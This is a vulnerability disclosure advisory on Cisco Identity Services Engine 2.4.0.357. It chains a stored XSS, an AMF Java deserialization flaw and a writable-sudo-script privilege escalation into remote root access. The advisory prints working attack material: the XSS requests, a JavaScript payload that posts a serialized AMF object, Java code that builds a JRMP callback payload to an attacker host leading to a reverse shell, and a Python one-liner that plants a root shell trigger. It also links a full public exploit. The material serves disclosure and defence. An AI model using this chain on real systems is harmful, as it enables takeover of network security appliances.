# Multiple vulnerabilities in Cisco Identity Services Engine (XSS to RCE as root)
### By Pedro Ribeiro (pedrib@gmail.com | [@pedrib1337](https://twitter.com/pedrib1337)) from [Agile Information Security](https://agileinfosec.co.uk) and Dominik Czarnota (dominik.b.czarnota@gmail.com)

#### Disclosure: 20/01/2019 / Last updated: 30/06/2021

* [Product information](#product-information)
* [Summary](#summary)
* [Vulnerability Details](#vulnerability-details)
    * [#1: Stored Cross Site Scripting](#1-stored-cross-site-scripting)
    * [#2: Unsafe Flex AMF Java Object Deserialization](#2-unsafe-flex-amf-java-object-deserialization)
    * [#3: Privilege Escalation via Incorrect sudo and File Permissions](#3-privilege-escalation-via-incorrect-sudo-and-file-permissions)
* [End to End Exploit](#end-to-end-exploit)
* [Fixes / Solutions](#fixes--solutions)

## Product information
[From the vendor's website](https://www.cisco.com/c/en/us/products/collateral/security/identity-services-engine/data_sheet_c78-656174.html):
> The Cisco Identity Services Engine (ISE) is your one-stop solution to streamline security policy management and reduce operating costs. With ISE, you can see users and devices controlling access across wired, wireless, and VPN connections to the corporate network.

> Cisco ISE allows you to provide highly secure network access to users and devices. It helps you gain visibility into what is happening in your network, such as who is connected, which applications are installed and running, and much more. It also shares vital contextual data, such as user and device identities, threats, and vulnerabilities with integrated solutions from Cisco technology partners, so you can identify, contain, and remediate threats faster."


## Summary
ISE is distributed by Cisco as a virtual appliance. We have analysed version 2.4.0.357 and found three vulnerabilities: an unauthenticated stored cross site scripting, a authenticated Java deserialization vulnerability leading to remote code execution as an unprivileged user, and a privilege escalation from that unprivileged user to root.

By putting them all together, we can achieve remote code execution as root, provided we can convince an administrator into visiting the ISE page vulnerable to the stored cross site scripting. Therefore, this vulnerability chain is ideal to demonstrate the risks of Cross Site Scripting when paired with a phishing attack.

A Ruby exploit that implements this full exploit chain (described in more detail in [End to End Exploit](#end-to-end-exploit), at the end of this file) is [publicly available](https://github.com/pedrib/PoC/blob/master/exploits/ISEpwn/ISEpwn.rb) in the [same repository](https://github.com/pedrib/PoC/blob/master/advisories/Cisco/cisco_ise_rce.md) as this advisory.

You can also see a [video of the exploit in action](https://www.youtube.com/watch?v=NZmZid-1_jU) on YouTube.

[![ISEpwn video](https://img.youtube.com/vi/NZmZid-1_jU/0.jpg)](https://www.youtube.com/watch?v=NZmZid-1_jU)

All the vulnerabilities in this advisory were found independently by Agile Information Security. However, vulnerability #2 (Unsafe Flex AMF Java Object Deserialization) was also [found and reported to Cisco](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvj62599) by Olivier Arteau of Groupe Technologie Desjardins and vulnerability #3 (Privilege Escalation via Incorrect sudo File Permissions) was also [found and reported to Cisco](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCve49987) by Hector Cuesta.

While [Cisco attributed credit](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190109-ise-multi-xss) to Agile Information Security for finding vulnerability #1, it did not do so with finding vulnerabilities #2 and #3, and also refused to provide a CVE for both these vulnerabilities. 

It also said that regarding #3:
> "This issue has been evaluated as a hardening effort to improve the security posture of the device. According with our Security vulnerability policy, we request do not request a CVE assignment for issue with a Severity Impact Rating (SIR) lower than Medium. This issue will be fixed in the upcoming ISE release". 

As of 05/02/2019, Cisco still recommends version 2.4.0.357 - affected by all the vulnerabilities in this advisory - as the "Suggested Release" in their software download page.

These actions show Cisco is incredibly negligent with regards to the security of their customers. They are still shipping (and recommending) a product version vulnerable to unauthenticated remote code execution, with a fully working public exploit and no way to track fixes or fixed versions for these vulnerabilities.

Agile Information Security would like to thank Beyond Security's SSD Secure Disclosure programme for helping us disclose these vulnerabilities to Cisco, and publishing the advisory [on their site](https://ssd-disclosure.com/index.php/archives/3778).

This advisory was last updated in 30/06/2021 (ported to markdown, polished exploit and video link added).


## Vulnerability Details
### #1: Stored Cross Site Scripting
* [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
* [CVE-2018-15440](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15440)
* Risk Classification: High
* Attack Vector: Remote
* Constraints: None; exploitable by an unauthenticated attacker
* Affected versions: confirmed on ISE virtual appliance v2.4.0.357

The *LiveLogSettingsServlet*, exposed to unauthenticated users at */admin/LiveLogSettingsServlet*, contains a stored cross site scripting vulnerability.
The *doGet()* HTTP request handler takes in an *Action* parameter as a HTTP query variable, which can be "read" or "write". 

With the "write" parameter, it calls the *writeLiveLogSettings()* function which then takes several query string variables, such as Columns, Rows, Refresh_rate and Time_period.

The content of these query string variables is then written to */opt/CSCOcpm/mnt/dashboard/liveAuthProps.txt*, and the server responds with an HTTP 200 OK. These parameters are not validated, and can contain any text.

When the *Action* parameter equals "read", the servlet will read the */opt/CSCOcpm/mnt/dashboard/liveAuthProps.txt* file and display it back to the user with the Content-Type *"text/html"*, causing whatever was written to that file to be rendered and executed by the browser.

To mount a simple attack, we can send the following request:
```
GET /admin/LiveLogSettingsServlet?Action=write&Columns=1&Rows=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&Refresh_rate=1337&Time_period=1337
```

Which can then be triggered with:
```
GET /admin/LiveLogSettingsServlet?Action=read HTTP/1.1


HTTP/1.1 200 OK
Content-Type: text/html;charset=UTF-8
Content-Length: 164
Server:  

<Settings>
<Columns>
<Col>1</Col>
</Columns>
<Rows><script>alert(1)</script></Rows>
<Refresh_rate>1337</Refresh_rate>
<Time_period>1337</Time_period>
</Settings>
```

This will result in an alert box being popped in the browser, which means Javascript code was executed in the browser. This vulnerability can be exploited by an unauthenticated attacker.


### #2: Unsafe Flex AMF Java Object Deserialization
* [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
* [CVE-2017-5641](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5641)
* Risk Classification: Critical
* Attack Vector: Remote
* Constraints: Requires authentication to the admin web interface
* Affected versions: confirmed on ISE virtual appliance v2.4.0.357

By sending an HTTP POST request with random data to */admin/messagebroker/amfsecure*, the server will respond with a 200 OK and binary data that includes:
```
 ...Unsupported AMF version XXXXX...
```

Which indicates that the server has a Apache / Adobe Flex AMF (BlazeDS) endpoint at that location. The BlazeDS library version running on the server is 4.0.0.14931, which means it is [vulnerable to CVE-2017-5641](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5641), the description of which is stated below:

> "Previous versions of Apache Flex BlazeDS (4.7.2 and earlier) did not restrict which types were allowed for AMF(X) object deserialization by default. During the deserialization process code is executed that for several known types has undesired side-effects. Other, unknown types may also exhibit such behaviors. One vector in the Java standard library exists that allows an attacker to trigger possibly further exploitable Java deserialization of untrusted data. Other known vectors in third party libraries can be used to trigger remote code execution."

This vulnerability was [previously exploited](https://github.com/pedrib/PoC/tree/master/exploits/acsPwn) in [DrayTek VigorACS](https://raw.githubusercontent.com/pedrib/PoC/master/advisories/draytek-vigor-acs.txt) by Agile Information Security. Please refer to that advisory and exploit, as well as [these](https://issues.apache.org/jira/browse/FLEX-35290) [other](http://codewhitesec.blogspot.ru/2017/04/amf.html) [resources](https://github.com/mbechler/marshalsec) for further details on this vulnerability.

We were able to re-use some of the exploit code [from the VigorACS advisory](https://github.com/pedrib/PoC/tree/master/exploits/acsPwn) to create a binary AMF payload that will execute on the server as the iseadminportal user.

The the exploit chain works in the same way:

1. sends an AMF binary payload to */admin/messagebroker/amfsecure* [as described here](http://codewhitesec.blogspot.ru/2017/04/amf.html) to trigger a Java Remote Method Protocol (JRMP) call back to the attacker
2. receives the JRMP connection with [ysoserial's JRMP listener](https://github.com/frohoff/ysoserial) 
3. calls ysoserial with the ROME payload, as a vulnerable version of Rome (1.0 RC2) is in the Java classpath of the server
4. execute ncat (the binary is on the ISE virtual appliance) and return a reverse shell running as the iseaminportal user

It is highly recommended to read [the advisory by Markus Wulftange](http://codewhitesec.blogspot.ru/2017/04/amf.html) of Code White for a better understanding of this vulnerability.

This vulnerability can only be exploited by an authenticated attacker with access to the administrative portal.


### #3: Privilege Escalation via Incorrect sudo and File Permissions
* [CWE-268: Privilege Chaining](https://cwe.mitre.org/data/definitions/268.html)
* No CVE assigned; track as SSD-3778
* Risk Classification: High
* Attack Vector: Local
* Constraints: Requires a command shell running as the iseadminportal user
* Affected versions: confirmed on ISE virtual appliance v2.4.0.357

The iseadminportal user can run a variety of commands as root via sudo (output of 'sudo -l'):
```
    (root) NOPASSWD: /opt/CSCOcpm/bin/resetMntDb.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/resetMnTSessDir.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/setdbpw.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/sync_export.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/sync_import.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/partial_sync_export.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/partial_sync_import.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/partial_sync_cleanup.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/ttcontrol.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/updatewallet.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/log-list.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/file-info.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/delete-log-file.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/debug-log-config.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/showinv.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/isebackupcancel.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/nssutils.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/killsubnetscan.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/thirdpartyguestvlan.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/ise-3rdpty-guestvlan.sh *
    (root) NOPASSWD: /opt/CSCOcpm/mnt/bin/CheckDiskSpace.sh *
    (root) NOPASSWD: /opt/CSCOcpm/upgrade/bin/genbackup.sh *
    (root) NOPASSWD: /opt/CSCOcpm/upgrade/bin/createHCTOnPAPScript.sh *
    (root) NOPASSWD: /opt/CSCOcpm/upgrade/bin/backupHostConfigTablesOnPAP.sh *
    (root) NOPASSWD: /opt/CSCOcpm/upgrade/bin/dictionary_attribute_update.sh *
    (root) NOPASSWD: /opt/CSCOcpm/upgrade/bin/deleteguest.sh *
    (root) NOPASSWD: /opt/CSCOcpm/upgrade/bin/iseupgrade-dbexport.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/pxgrid_backup.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/pxgrid_restore.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/pxgrid_sync.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/pbis_monit.sh *
    (root) NOPASSWD: /opt/CSCOcpm/prrt/bin/FIPS_lockdown.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/iseupgradeui.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/show_iowait.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/kerberosprobe.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/sxp-servercontrol.sh *
```

However all of the files above are writeable by the iseadminportal user. This makes it trivial to perform privilege escalation to root. All that is needed to do is to edit the files, and add a "/bin/sh" to the second and / or last line, then run the script as sudo to get a root shell.

## End to End exploit
By now you should have a decent idea of how to build a full exploit chain. Since vulnerability #2 (AMF RCE) can only be exploited by an authenticated administrator, we can set up a trap using vulnerability #1 (stored XSS) as an unauthenticated attacker.

The attack sequence is as follows:

1. By abusing the stored cross site scripting (vulnerability #1), we can create a malicious Javascript (payload below) that will be stored in */admin/LiveLogSettingsServlet*
2. If a logged in user visits that page, the Javascript payload will send a *XMLHttpRequest* to */admin/messagebroker/amfsecure* with the payload created by the AMF Java code below (vulnerability #2), achieving remote code execution as the iseadminportal user
3. The exploit code will return a reverse shell, and we can then use the incorrect file permissions (vulnerability #3) to escalate our privileges to root:

```
python -c 'import os;f=open("/opt/CSCOcpm/bin/file-info.sh", "a+", 0);f.write("if [ \"$1\" == 1337 ];then\n/bin/bash\nfi\n");f.close();os.system("sudo /opt/CSCOcpm/bin/file-info.sh 1337")'
```

This python code will add an "if" clause at the end of */opt/CSCOcpm/bin/file-info.sh* that looks for the "1337" parameter, and executes /bin/bash as root when it sees it. That way we won't mess with any important system functionality that might use that file, and we will get our full root shell.

The full exploit, written in Ruby, [is available here](https://github.com/pedrib/PoC/blob/master/exploits/ISEpwn/ISEpwn.rb).

Javascript payload:
```javascript
<script>
function b64toBlob(b64Data, contentType, sliceSize) {
  contentType = contentType || '';
  sliceSize = sliceSize || 512;
  var byteCharacters = atob(b64Data);
  var byteArrays = [];
  for (var offset = 0; offset < byteCharacters.length; offset += sliceSize) {
    var slice = byteCharacters.slice(offset, offset + sliceSize);
    var byteNumbers = new Array(slice.length);
    for (var i = 0; i < slice.length; i++) {
      byteNumbers[i] = slice.charCodeAt(i);
    }
    var byteArray = new Uint8Array(byteNumbers);
    byteArrays.push(byteArray);
  }
  var blob = new Blob(byteArrays, {type: contentType});
  return blob;
}
b64_payload = 'cGlzc2FuZXNzZWN1';
var xhr = new XMLHttpRequest();
xhr.open("POST", 'https://10.10.10.44/admin/messagebroker/amfsecure', true);
xhr.send(b64toBlob(b64_payload, 'application/x-amf')); 
</script>
```

AMF Java code ([provided here](https://github.com/pedrib/PoC/tree/master/exploits/ISEpwn/ACSFlex) as a Maven project):
```java
package uk.co.agileinfosec.acsflex;

import flex.messaging.io.amf.MessageBody;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.AmfMessageSerializer;
import java.io.*;

public class ACSFlex {
    public static void main(String[] args) {
        Object unicastRef = generateUnicastRef(args[0], Integer.parseInt(args[1]));
        // serialize object to AMF message
        try {
            byte[] amf = new byte[0];
            amf = serialize((unicastRef));
            DataOutputStream os = new DataOutputStream(new FileOutputStream(args[2]));
            os.write(amf);
            System.out.println("Done, payload written to " + args[2]);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static Object generateUnicastRef(String host, int port) {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }

    public static byte[] serialize(Object data) throws IOException {
        MessageBody body = new MessageBody();
        body.setData(data);

        ActionMessage message = new ActionMessage();
        message.addBody(body);

        ByteArrayOutputStream out = new ByteArrayOutputStream();

        AmfMessageSerializer serializer = new AmfMessageSerializer();
        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
        serializer.writeMessage(message);

        return out.toByteArray();
    }
}
```

## Fixes / Solutions:
[Cisco claims](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvm79609) vulnerability #1 is fixed in version 2.2.0.913. [It is unknown](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190109-ise-multi-xss) if it is fixed in versions 2.4.x.
[Cisco claims](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvj62599) vulnerability #2 is fixed in version 2.4.0.905.
By [Cisco's own admission](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCve49987), vulnerability #3 is not fixed as of 05/02/2019.


## Disclaimer
Please note that Agile Information Security (Agile InfoSec) relies on information provided by the vendor when listing fixed versions or products. Agile InfoSec does not verify this information, except when specifically mentioned in this advisory or when requested or contracted by the vendor to do so.   
Unconfirmed vendor fixes might be ineffective or incomplete, and it is the vendor's responsibility to ensure the vulnerabilities found by Agile Information Security are resolved properly.  
Agile Information Security Limited does not accept any responsibility, financial or otherwise, from any material losses, loss of life or reputational loss as a result of misuse of the information or code contained or mentioned in this advisory. It is the vendor's responsibility to ensure their products' security before, during and after release to market.

## License
All information, code and binary data in this advisory is released to the public under the [GNU General Public License, version 3 (GPLv3)](https://www.gnu.org/licenses/gpl-3.0.en.html).  
For information, code or binary data obtained from other sources that has a license which is incompatible with GPLv3, the original license prevails.
